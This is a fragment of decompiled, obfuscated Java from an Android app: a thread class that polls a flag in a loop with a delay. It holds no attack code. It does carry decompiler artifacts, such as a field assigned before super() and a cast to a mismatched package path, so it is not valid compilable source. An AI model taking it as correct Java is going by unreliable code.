package com.example.mmm.Activity;

import com.example.mmm.Utils.*;

final class actViewInjection$StopThread implements Runnable
{
    final actViewInjection kevin$;
    
    actViewInjection$StopThread(final actViewInjection kevin$) {
        ((com.example.mmm.actViewInjection$StopThread)this).kevin$ = kevin$;
        super();
    }
    
    @Override
    public final void run() {
        int n = 0;
        while (true) {
            utils.chalkTile(1000);
            if (actViewInjection.d(((com.example.mmm.actViewInjection$StopThread)this).kevin$)) {
                break;
            }
            ++n;
        }
    }
}
